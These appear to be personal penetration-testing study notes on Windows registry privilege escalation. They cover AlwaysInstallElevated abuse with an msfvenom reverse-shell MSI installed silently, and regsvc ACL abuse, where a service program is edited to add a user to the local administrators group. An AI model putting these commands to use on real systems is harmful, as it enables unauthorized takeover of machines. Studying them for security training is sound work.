# Registry 
-----------------

## Autoruns
----------------




## AlwaysInstallElevated
-----------------------------------

https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/


check if both the reg keys are present and are equal to "0x1", we can use this to get a reverse shell 



we can also do this using PowerUp

generate a reverse shell payload using msfvenom and install it in the victim system

```cmd
C:> msiexec /quiet /qn /i  install.ms
```



## regsvc ACL
-------------------

check if we have full control over a registry key using regsvc (Registry Service)

if we have full control over a registry key we can compile a C program and execute it 

```Powershell
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```

copy this file to the linux machine 

```cmd
C:\Users\User\Desktop\Tools\Source\windows_service.c
```

replace the command used by the system() function to:

```C
cmd.exe /k net localgroup administrators user /add
```

